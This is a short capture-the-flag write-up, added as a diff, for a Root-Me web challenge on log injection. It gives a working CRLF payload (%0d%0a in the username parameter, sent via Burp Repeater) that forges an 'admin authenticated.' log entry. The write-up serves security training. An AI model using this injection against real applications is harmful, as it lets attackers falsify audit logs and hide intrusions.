@@ -1,0 +1,29 @@
+Challenge : Inject false data in the journalisation log.
+Site : http://challenge01.root-me.org/web-serveur/ch14/
+
+1: If i browse this web page, firstly i found 3 logs :
+log:
+"admin failed to authenticate.
+admin authenticated.
+guest failed to authenticate.
+log:
+
+2: So i use username: "exp" and click Connect button and found extra 1 log :
+log:
+exp failed to authenticate.
+log:
+
+3. I think the developer is control the $username and response $username + "failed to authenticate.".
+
+4. I intercept the request from Burpsuite and send to Repeater. Then i added CRLF payload "%0d%0a" behind the request method :
+Request:
+GET /web-serveur/ch14/?username=admin%20authenticated.%0d%0aexp&password=none HTTP/1.1
+Request:
+
+5. Now, i found the flag in response. 
+
+Note : 
+%20 = space ( )
+%0d = carriage return (\r)
+%0a = line feed (\n)
+
